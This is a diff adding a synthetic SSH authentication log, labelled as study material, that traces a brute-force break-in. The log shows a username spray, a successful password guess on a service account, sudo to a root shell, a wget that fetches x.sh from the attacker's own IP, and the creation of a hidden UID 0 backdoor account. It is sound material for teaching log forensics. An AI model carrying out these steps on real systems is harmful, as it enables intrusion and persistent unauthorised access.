@@ -1,0 +1,28 @@
+# SYNTHETIC sample log for study/demo. Not real. IPs are in reserved
+# documentation ranges (RFC 5737: 203.0.113.0/24, 198.51.100.0/24).
+Aug 19 09:41:02 webserver sshd[2011]: Accepted password for jdoe from 198.51.100.23 port 52212 ssh2
+Aug 19 09:41:02 webserver sshd[2011]: pam_unix(sshd:session): session opened for user jdoe by (uid=0)
+Aug 19 09:58:44 webserver sshd[2044]: Accepted publickey for jdoe from 198.51.100.23 port 52240 ssh2
+Aug 19 10:00:11 webserver sshd[3120]: Failed password for invalid user admin from 203.0.113.66 port 40122 ssh2
+Aug 19 10:00:12 webserver sshd[3121]: Failed password for invalid user root from 203.0.113.66 port 40124 ssh2
+Aug 19 10:00:13 webserver sshd[3122]: Failed password for invalid user test from 203.0.113.66 port 40126 ssh2
+Aug 19 10:00:14 webserver sshd[3123]: Failed password for invalid user oracle from 203.0.113.66 port 40128 ssh2
+Aug 19 10:00:15 webserver sshd[3124]: Failed password for invalid user postgres from 203.0.113.66 port 40130 ssh2
+Aug 19 10:00:16 webserver sshd[3125]: Failed password for invalid user git from 203.0.113.66 port 40132 ssh2
+Aug 19 10:00:17 webserver sshd[3126]: Failed password for invalid user ubuntu from 203.0.113.66 port 40134 ssh2
+Aug 19 10:00:18 webserver sshd[3127]: Failed password for invalid user deploy from 203.0.113.66 port 40136 ssh2
+Aug 19 10:01:30 webserver sshd[3200]: Failed password for backupsvc from 203.0.113.66 port 40220 ssh2
+Aug 19 10:01:33 webserver sshd[3201]: Failed password for backupsvc from 203.0.113.66 port 40224 ssh2
+Aug 19 10:01:36 webserver sshd[3202]: Failed password for backupsvc from 203.0.113.66 port 40228 ssh2
+Aug 19 10:01:39 webserver sshd[3203]: Failed password for backupsvc from 203.0.113.66 port 40232 ssh2
+Aug 19 10:01:42 webserver sshd[3204]: Failed password for backupsvc from 203.0.113.66 port 40236 ssh2
+Aug 19 10:01:45 webserver sshd[3205]: Failed password for backupsvc from 203.0.113.66 port 40240 ssh2
+Aug 19 10:01:48 webserver sshd[3206]: Failed password for backupsvc from 203.0.113.66 port 40244 ssh2
+Aug 19 10:04:12 webserver sshd[3320]: Accepted password for backupsvc from 203.0.113.66 port 40320 ssh2
+Aug 19 10:04:12 webserver sshd[3320]: pam_unix(sshd:session): session opened for user backupsvc by (uid=0)
+Aug 19 10:05:01 webserver sudo:  backupsvc : TTY=pts/1 ; PWD=/home/backupsvc ; USER=root ; COMMAND=/bin/bash
+Aug 19 10:05:47 webserver sudo:  backupsvc : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.66/x.sh
+Aug 19 10:06:20 webserver useradd[3390]: new user: name=svc_backup, UID=0, GID=0, home=/home/svc_backup, shell=/bin/bash
+Aug 19 10:06:21 webserver passwd[3392]: password for 'svc_backup' changed by 'root'
+Aug 19 10:07:10 webserver sshd[3410]: Accepted password for svc_backup from 203.0.113.66 port 40510 ssh2
+Aug 19 10:12:05 webserver sshd[3500]: Accepted publickey for jdoe from 198.51.100.23 port 52410 ssh2
